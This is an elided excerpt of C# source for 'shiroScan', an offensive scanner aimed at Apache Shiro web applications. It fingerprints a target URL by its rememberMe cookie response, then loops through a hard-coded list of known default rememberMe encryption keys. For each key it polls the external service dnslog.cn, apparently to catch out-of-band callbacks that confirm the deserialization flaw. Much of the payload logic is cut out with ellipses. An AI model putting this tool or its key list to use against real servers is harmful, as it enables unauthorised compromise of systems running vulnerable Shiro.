...
namespace shiroScan
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("shiroScan.exe url");
                Process.GetCurrentProcess().Kill();
            }
            
            // 查看是否有rememberMe=deleteMe返回，以此判断是否为shiro
            bool isShiro = Tools.isShiro(args[0]);
            Console.WriteLine("isShiro：" + isShiro);
            if (!isShiro)
            {
                Process.GetCurrentProcess().Kill();
            }
            ...
            string dnslogDomain = Tools.requestHttp("http://www.dnslog.cn/getdomain.php", dnslogSession);
    ...
    class Tools
    {
        ...
        // 查看是否有rememberMe=deleteMe返回
        public static bool isShiro(string uri)
        {
        ...
        // http请求
        public static string requestHttp(string uri, string cookies)
        {
            HttpWebRequest request = WebRequest.Create(uri) as HttpWebRequest;
            request.Method = WebRequestMethods.Http.Get;
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
    ...
    public class MyThread
    {
        static Dictionary<string, string> keyList = new Dictionary<string, string>()
        {
            ...
            {"k84","YTM0NZomIzI2OTsmIzM0NTueYQ=="},
            {"k85","c2hpcm9fYmF0aXMzMgAAAA=="},
            {"k86","i45FVt72K2kLgvFrJtoZRw=="},
            {"k87","U3BAbW5nQmxhZGUAAAAAAA=="},
            {"k88","ZnJlc2h6Y24xMjM0NTY3OA=="},
            {"k89","Jt3C93kMR9D5e8QzwfsiMw=="},
            {"k90","MTIzNDU2NzgxMjM0NTY3OA=="},
            {"k91","vXP33AonIp9bFwGl7aT7rA=="},
            {"k92","V2hhdCBUaGUgSGVsbAAAAA=="},
            {"k93","Z3h6eWd4enklMjElMjElMjE="},
            {"k94","Q01TX0JGTFlLRVlfMjAxOQ=="},
            {"k95","ZAvph3dsQs0FSL3SDFAdag=="},
            {"k96","Is9zJ3pzNh2cgTHB4ua3+Q=="},
            {"k97","NsZXjXVklWPZwOfkvk6kUA=="},
            {"k98","GAevYnznvgNCURavBhCr1w=="},
            {"k99","66v1O8keKNV3TTcGPK1wzg=="}
        };
        ...
        public void MyThreadMian()
        {
            ...
            foreach (KeyValuePair<string, string> key in keyList)
            {
                ...
                string dnslog = Tools.requestHttp("http://www.dnslog.cn/getrecords.php", dnslogSession);
